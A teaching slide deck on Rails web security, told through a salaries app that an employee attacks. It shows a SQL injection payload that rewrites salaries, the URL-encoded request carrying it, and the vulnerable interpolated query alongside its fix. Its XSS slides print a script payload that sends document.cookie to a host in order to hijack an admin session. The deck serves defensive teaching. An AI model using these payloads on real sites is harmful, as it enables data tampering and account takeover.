!SLIDE 
# Web Security With Rails #

!SLIDE bullets incremental
# The Application #

* Some guy is going nuts, he can not handle his company salaries and raises process.
* He contacts you and ask you to build a quite simple application

!SLIDE bullets incremental
# And you build it! #

* Awesome, the application works. Everyone is happy. That's it right?
 
!SLIDE bullets incremental
# Day 1 - Injection #

* Early morning call from your customer.
* One employe automagically raised his own salary and was fired... so fix it.

!SLIDE bullets incremental
#Did some research#

* You found that that user used an Injection attack. He modified the query string adding and update statement.
* Query: javascript:alert(escape('1; UPDATE salaries SET amount = 123456789 WHERE user_id = 3;'))
* GET /raises/1
* GET /users/1%3B%20UPDATE%20salaries%20SET%20amount%20%3D%20123456789%20WHERE%20user_id%20%3D%203%3B

!SLIDE bullets incremental small
#The fix#

* Previously had:
 * @user = User.find(:all, :conditions => "id = #{params[:id]}").first
* Now he have:
 * @user = User.find(params[:id])

!SLIDE bullets incremental
#Sanitize input#

* Use whitelist validation
* Use find, find_by 
 * If you need SQL fragments use:
  * An array of sanitized tainted strings
  * Pass a hash

!SLIDE bullets incremental
#Day 2 - Cross-Site Scripting(XSS)#

* Early morning call from your customer. Seems like somebody has been using his admin account.
* He lost control of the admin account.

!SLIDE bullets incremental
#access.log#

* access.log says 127.0.0.1 - - [19/Sep/2010:00:28:57 -0500] "GET / HTTP/1.1" 304 210 "http://localhost/****"

!SLIDE bullets incremental
#developer.log#

* Parameters: {"authenticity_token"=>"vCuopAoDRRfNocbJCBjjJscrAH+ABDAPkXeuHEBsoR0=", "utf8"=>"✓", "id"=>"3", "user"=>{"role_id"=>"3", "salary_attributes"=>{"amount"=>"123.0", "id"=>"3"}, "site"=>"<script>document.write('<img src=\"http://localhost/' + document.cookie + '\" >')</script>", "password"=>"[FILTERED]", "email"=>"employee@test.com"}}
* <script>document.write('<img src="http://localhost/' + document.cookie + '" >')</script>
